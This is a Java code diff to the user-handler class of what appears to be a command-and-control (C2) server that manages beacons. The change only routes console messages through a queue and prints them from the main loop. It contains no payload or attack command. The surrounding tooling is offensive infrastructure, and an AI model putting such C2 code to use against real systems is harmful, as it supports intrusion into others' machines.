@@ -5,6 +5,7 @@ import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
 import java.util.HashMap;
 import java.util.Scanner;
+import java.util.Queue;
 
 public class C2ServerUserHandler implements Runnable{
     private String RED = "\u001B[31m";
@@ -27,6 +28,9 @@ public class C2ServerUserHandler implements Runnable{
 
     // The User's current Path in the CLI
     private String currentUserPath;
+
+    // Queue of messages to be printed to the CLI
+    private Queue<String> messageQueue;
 
     /**
      * Class to handle input from the user controlling the C2
@@ -84,7 +88,7 @@ public class C2ServerUserHandler implements Runnable{
      * @param message Message to be displayed
      */
     protected void outputToCLI(String message){
-        System.out.println(message);
+        messageQueue.add(message);
     }
 
     private void printHome(){
@@ -246,6 +250,11 @@ public class C2ServerUserHandler implements Runnable{
                     }
                     beaconsWaitingForMFA.notifyAll();
                 }
+            }
+
+            // Print all messages waiting in the queue.
+            while(!(messageQueue.isEmpty())){
+                System.out.println(messageQueue.remove());
             }
             
             if(currentUserPath.equals("")){
